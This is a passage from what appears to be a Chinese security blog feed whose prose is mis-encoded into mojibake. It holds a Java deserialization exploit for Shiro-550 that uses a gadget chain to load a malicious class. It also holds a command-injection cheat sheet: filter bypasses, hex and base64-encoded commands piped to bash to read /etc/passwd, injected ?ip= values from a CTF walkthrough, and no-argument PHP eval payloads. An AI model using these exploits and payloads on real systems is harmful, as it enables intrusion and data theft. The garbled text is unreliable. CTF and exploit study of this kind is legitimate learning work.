class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CB</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; c2 = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211202031925.png" alt="image-20221120203130864"></p><h3 id="ysoseriaé“¾é—®é¢˜"><a href="#ysoseriaé“¾é—®é¢˜" class="headerlink" title="ysoseriaé“¾é—®é¢˜"></a>ysoseriaé“¾é—®é¢˜</h3><p>åœ¨ä½¿ç”¨ysoseriaé“¾å¸¦çš„Expæ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211202034891.png" alt="image-20221120203408860"></p><p>serialVersionUIDä¸åŒ¹é…</p><p>åŸå› å‡ºåœ¨ysoseriaæ˜¯åˆ©ç”¨çš„CommonsBeanutils1.9.2çš„ä¾èµ–ï¼Œè€Œshiro550è‡ªå¸¦çš„æ˜¯CommonsBeanutils1.8.3ï¼Œä»£ç æ˜¯æœ‰äº›è®¸å·®åˆ«çš„</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> shiro550 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rce?</title>
      <link href="/2022/10/07/rce/"/>
      <url>/2022/10/07/rce/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œ-rce"><a href="#å‘½ä»¤æ‰§è¡Œ-rce" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ(rce)"></a>å‘½ä»¤æ‰§è¡Œ(rce)</h1><p><strong>ä»£ç æ‰§è¡Œå‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">eval()</span><br><span class="line">assert()</span><br><span class="line">create_function()</span><br><span class="line">preg_replace() +/eæ¨¡å¼(PHPç‰ˆæœ¬&lt;5.5.0)</span><br><span class="line">call_user_func()</span><br><span class="line"></span><br><span class="line">//Javascript</span><br><span class="line">eval()</span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤æ‰§è¡Œå‡½æ•°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//php</span><br><span class="line">system()</span><br><span class="line">exec()  //æ— å›æ˜¾</span><br><span class="line">passthru() </span><br><span class="line">shell_exec()</span><br><span class="line">``åå¼•å·</span><br><span class="line"></span><br><span class="line">//python</span><br><span class="line">popen()</span><br><span class="line">proc_open() </span><br><span class="line">exec()</span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤è¿æ¥ç¬¦</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A;B //å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB</span><br><span class="line"></span><br><span class="line">A|B //åªæ‰§è¡ŒBé‚£æ¡å‘½ä»¤</span><br><span class="line"> </span><br><span class="line">A||B //Aæ‰§è¡Œå¤±è´¥æ‰ä¼šæ‰§è¡ŒB</span><br><span class="line"></span><br><span class="line">A&amp;B //ABä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span><br><span class="line"> </span><br><span class="line">A&amp;&amp;B //Aæ‰§è¡ŒæˆåŠŸæ‰ä¼šæ‰§è¡ŒB</span><br></pre></td></tr></table></figure><h1 id="å¸¸è§ç»•è¿‡"><a href="#å¸¸è§ç»•è¿‡" class="headerlink" title="å¸¸è§ç»•è¿‡"></a>å¸¸è§ç»•è¿‡</h1><p>ç»•è¿‡ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 </span><br><span class="line">&lt;å’Œ&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20(space)</span><br><span class="line">%09(tab)</span><br></pre></td></tr></table></figure><p>ç»•è¿‡<strong>flag</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;cat $a$b</span><br><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line">fl\ag</span><br><span class="line">cat f&quot;&quot;lag</span><br><span class="line">cat f*</span><br><span class="line">cat f???</span><br><span class="line">cat ????.???</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡cat</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nl</span><br><span class="line">head</span><br><span class="line">tail</span><br><span class="line">ca\t</span><br><span class="line">more</span><br><span class="line">tac</span><br><span class="line">sort</span><br><span class="line">od</span><br><span class="line">uniq</span><br><span class="line">less</span><br></pre></td></tr></table></figure><p><strong>ç»•è¿‡php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= #çŸ­æ ‡ç­¾</span><br><span class="line">Php #å¤§å°å†™</span><br></pre></td></tr></table></figure><h2 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h2><p><strong>hexç¼–ç (åå…­è¿›åˆ¶ï¼‰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;636174202F6574632F706173737764&quot;</span> | xxd -r -p|bash   <span class="comment">#cat /etc/passwd</span></span><br></pre></td></tr></table></figure><p><strong>octç¼–ç (å…«è¿›åˆ¶)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\154\163&quot;</span>)  <span class="comment">#ls</span></span><br></pre></td></tr></table></figure><p><strong>base64ç¼–ç </strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y2F0IC9ldGMvcGFzc3dk <span class="comment">#cat /etc/passwd</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Y2F0IC9ldGMvcGFzc3dk&#x27;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure><h2 id="æ‹¼æ¥ç»•è¿‡"><a href="#æ‹¼æ¥ç»•è¿‡" class="headerlink" title="æ‹¼æ¥ç»•è¿‡"></a>æ‹¼æ¥ç»•è¿‡</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> test.txt</span><br><span class="line">c<span class="string">&#x27;&#x27;</span>a<span class="string">&#x27;&#x27;</span>t /etc/passwd</span><br><span class="line">c<span class="string">&quot;&quot;</span>a<span class="string">&quot;&quot;</span>t /etc/passwd</span><br><span class="line">c``a``t /etc/passwd</span><br><span class="line">ca\t /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="é€šé…ç¬¦ç»•è¿‡"><a href="#é€šé…ç¬¦ç»•è¿‡" class="headerlink" title="é€šé…ç¬¦ç»•è¿‡"></a>é€šé…ç¬¦ç»•è¿‡</h2><p>Linuxä¸‹çš„globé€šé…ç¬¦ï¼š</p><ul><li><code>*</code>å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦</li><li><code>?</code>å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</li></ul><p>ä¾‹å¦‚<code>cat 1.php</code>å¯ä»¥å†™æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/?[a][t] 1.???        #/???/?[a][t]å›å»åŒ¹é…/bin/cat</span><br></pre></td></tr></table></figure><p>åœ¨globé‡Œ</p><p><code>[A-Za-z0-9]</code>ç›¸å½“äºæ‰€æœ‰æ•°å­—å’Œå¤§å°å†™å­—æ¯</p><p><code>[-%]</code> ä»£è¡¨<code>[!â€#$%]</code>è€Œ<code>[az]</code>ä»£è¡¨ä»»ä½•å°å†™å­—æ¯</p><p><code>[@-[]</code>è¡¨ç¤ºå¤§å†™å­—æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. [...]è¡¨ç¤ºåŒ¹é…æ–¹æ‹¬å·ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">2. &#123;â€¦&#125;è¡¨ç¤ºåŒ¹é…å¤§æ‹¬å·é‡Œé¢çš„æ‰€æœ‰æ¨¡å¼ï¼Œæ¨¡å¼ä¹‹é—´ä½¿ç”¨é€—å·åˆ†éš”ã€‚</span><br><span class="line">3. &#123;...&#125;ä¸[...]æœ‰ä¸€ä¸ªé‡è¦çš„åŒºåˆ«ï¼Œå½“åŒ¹é…çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œ[...]ä¼šå¤±å»æ¨¡å¼çš„åŠŸèƒ½ï¼Œå˜æˆä¸€ä¸ªå•çº¯çš„å­—ç¬¦ä¸²ï¼Œè€Œ&#123;...&#125;ä¾ç„¶å¯ä»¥å±•å¼€</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> t[a-z]st</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082123331.png" alt="image-20221008212308275"></p><p><strong>ä¸€ä¸ªå°å°çš„ä¾‹é¢˜</strong></p><h2 id="GXYCTF2019-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping"></a>[GXYCTF2019]Ping Ping</h2><p>æç¤º&#x2F;?ip&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082242873.png" alt="image-20221008224212832"></p><p>è¯»å–flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071554412.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¯»å–index.phpï¼Œç©ºæ ¼ç”¨<code>$IFS$1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210072018448.png" alt="image-20221007201812408"></p><p>æ–¹æ³•ä¸€:å­—ç¬¦ä¸²æ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071554411.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ³•äºŒ:å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;<span class="built_in">cat</span>$IFS<span class="variable">$1</span>`<span class="built_in">ls</span>`</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼Œè·å¾—flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082243753.png" alt="image-20221008224333709"></p><h1 id="ç¯å¢ƒå˜é‡å–å€¼rce"><a href="#ç¯å¢ƒå˜é‡å–å€¼rce" class="headerlink" title="ç¯å¢ƒå˜é‡å–å€¼rce"></a>ç¯å¢ƒå˜é‡å–å€¼rce</h1><p>Linuxä¸‹é»˜è®¤å­˜åœ¨ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œå¯é€šè¿‡envæŸ¥çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082137603.png" alt="image-20221008213713529"></p><p>é€šè¿‡æˆªå–å¯è·å¾—ç‰¹å®šå­—ç¬¦</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082139149.png" alt="image-20221008213918093"></p><p>æ¯”å¦‚æ¯”è¾ƒé‡è¦çš„ç®¡é“ç¬¦<code>|</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082241804.png" alt="image-20221008224145767"></p><p>å†å¦‚<code>cat</code></p><p>è¿™æ ·å°±æ‹¿åˆ°äº†<code>cat</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082142228.png" alt="image-20221008214220186"></p><p>æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082143061.png" alt="image-20221008214329018"></p><p>æ­¤å¤–ï¼Œè¿˜å¯ä»¥é…åˆä¸Šé¢æ‰€è¯´åˆ°çš„ç¼–ç è·å–ä¸€äº›ç‰¹æ®Šå­—ç¬¦</p><h1 id="æ— å‚æ•°rce"><a href="#æ— å‚æ•°rce" class="headerlink" title="æ— å‚æ•°rce"></a>æ— å‚æ•°rce</h1><p>åŸºæœ¬ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>(?R)</code>è¡¨ç¤ºå¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯phpçš„<a href="https://www.php.net/manual/zh/regexp.reference.recursive.php">é€’å½’æ¨¡å¼</a></p><p>è¯¥æ­£åˆ™ï¼Œæ­£æ˜¯æ— å‚æ•°å‡½æ•°çš„æ ¡éªŒï¼Œåªå…è®¸æ‰§è¡Œå¦‚ä¸‹æ ¼å¼å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b());</span><br><span class="line">a(b(c()));</span><br></pre></td></tr></table></figure><p><strong>ç›¸å…³å‡½æ•°</strong></p><p>è¯»æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure><p>å…¶ä»–å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>()</span><br><span class="line"><span class="title function_ invoke__">getenv</span>() <span class="comment">//è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() <span class="comment">//ä»æ•°ç»„ä¸­å–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªéšæœºçš„å•å…ƒï¼Œå¹¶è¿”å›éšæœºæ¡ç›®çš„ä¸€ä¸ªæˆ–å¤šä¸ªé”®ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() <span class="comment">//array_flip()è¿”å›ä¸€ä¸ªåè½¬åçš„arrayï¼Œä¾‹å¦‚arrayä¸­çš„é”®åå˜æˆäº†å€¼ï¼Œè€Œarrayä¸­çš„å€¼æˆäº†é”®åã€‚</span></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() <span class="comment">//è·å–http headerä¿¡æ¯(ä¸­é—´ä»¶å¿…é¡»ä¸ºapache)</span></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() <span class="comment">//è·å–å…¨å±€å˜é‡</span></span><br><span class="line"><span class="title function_ invoke__">session_id</span>() <span class="comment">//session_id()å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯IDã€‚</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>() <span class="comment">//éå†ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">getcwd</span>() <span class="comment">//è·å–å½“å‰ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>() <span class="comment">//è¿”å›ä¸Šçº§ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>() <span class="comment">//æ›´æ”¹å½“å‰ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">localeconv</span>() <span class="comment">//è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">current</span>() <span class="comment">//è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼</span></span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() <span class="comment">//å°†æ•°ç»„è¿›è¡Œå€’åº</span></span><br><span class="line"><span class="title function_ invoke__">next</span>() <span class="comment">//å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>æ‰“å°å‡ºæ‰€æœ‰httpè¯·æ±‚å¤´ä¿¡æ¯ï¼Œéœ€apache2ç¯å¢ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081131687.png" alt="image-20221008113125635"></p><p>æ„é€ æ¶æ„ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081129289.png" alt="image-20221008112937236"></p><p>åˆ©ç”¨end()å°†ç»“æœä¸­çš„æ¶æ„ä»£ç å–å‡ºå¹¶åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081130259.png" alt="image-20221008113046202"></p><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p>ç›¸è¾ƒäºgetallheaders()çš„å±€é™æ€§ï¼Œæ˜¾ç„¶get_defined_vars()çš„ä½¿ç”¨æ›´å¹¿æ³›</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081145499.png" alt="image-20221008114558462"></p><p>ä»¥æ•°ç»„å½¢å¼æ‰“å°å‡ºæ‰€æœ‰å…¨å±€å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span></span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_FILES</span></span><br><span class="line"><span class="variable">$_COOKIE</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081149429.png" alt="image-20221008114903386"></p><p>åˆ©ç”¨æ–¹å¼ä¹Ÿå°±å‘¼ä¹‹æ¬²å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;test=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081152214.png" alt="image-20221008115213161"></p><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id"></a>session_id</h3><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081155600.png" alt="image-20221008115548563"></p><p>session_id()çš„ä½œç”¨å°±æ˜¯è·å–å½“å‰ä¼šè¯çš„ID,ä¹Ÿå°±æ˜¯cookieä¸­çš„phpsessionçš„å€¼ï¼Œé€šè¿‡æ„é€ PHPSESSIDä¸ºæ¶æ„ä»£ç æ‰§è¡Œå‘½ä»¤<br>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œphpsessionä¸­åªå…è®¸å‡ºç° a-z A-Z 0-9 , - ç­‰å­—ç¬¦ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œéœ€è¦å…ˆå°†å…¶è¿›è¡Œ16è¿›åˆ¶ç¼–ç åå†æ’å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081159770.png" alt="image-20221008115914731"></p><p>æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081159594.png" alt="image-20221008115944539"></p><h2 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h2><p>array_rand()é…åˆarray_flip()è·å–æ•°ç»„å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081203722.png" alt="image-20221008120313683"></p><p>current()é…åˆlocaleconv()è·å–<code>.</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line">    </span><br><span class="line"><span 